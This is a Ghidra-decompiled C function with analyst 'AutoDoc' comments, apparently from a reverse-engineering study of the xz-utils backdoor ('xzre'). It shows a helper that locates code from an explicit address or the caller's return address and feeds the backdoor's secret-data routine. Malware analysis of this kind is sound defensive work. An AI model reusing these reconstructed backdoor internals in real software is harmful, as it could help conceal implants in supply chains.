// /home/kali/xzre-ghidra/xzregh/10AB90_secret_data_append_bits_from_addr_or_ret.c
// Function: secret_data_append_bits_from_addr_or_ret @ 0x10AB90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_bits_from_addr_or_ret(void * addr, secret_data_shift_cursor_t shift_cursor, uint shift_count, uint operation_index)


/*
 * AutoDoc: Wrapper around `secret_data_append_singleton_bits` that supports two call styles. When `addr >= 2` it is treated as the explicit code address
 * used to locate the containing function and scan from its entry. When `addr` is NULL/1 the helper instead uses the caller’s return address
 * as the code pointer; NULL enables the “start after next CALL” mode and 1 disables it. Returns TRUE only when the singleton accepted
 * (or already satisfied) the descriptor.
 */

#include "xzre_types.h"

BOOL secret_data_append_bits_from_addr_or_ret
               (void *addr,secret_data_shift_cursor_t shift_cursor,uint shift_count,
               uint operation_index)

{
  BOOL append_ok;
  u8 *code_pointer;
  u8 *caller_return_address;
  
  code_pointer = (u8 *)addr;
  // AutoDoc: Treat NULL/1 as “use the caller’s RET” for the code pointer; the literal NULL vs 1 value is still forwarded as the `call_site` sentinel.
  if (addr < (void *)0x2) {
    code_pointer = caller_return_address;
  }
  // AutoDoc: Forward `addr` as the `call_site` sentinel (NULL enables start-from-call) plus whichever code pointer we settled on into the singleton helper.
  append_ok = secret_data_append_singleton_bits
                    ((u8 *)addr,code_pointer,shift_cursor,shift_count,operation_index);
  // AutoDoc: Normalize the singleton’s BOOL so callers only see TRUE once the descriptor actually registered.
  return (BOOL)(0 < (int)append_ok);
}

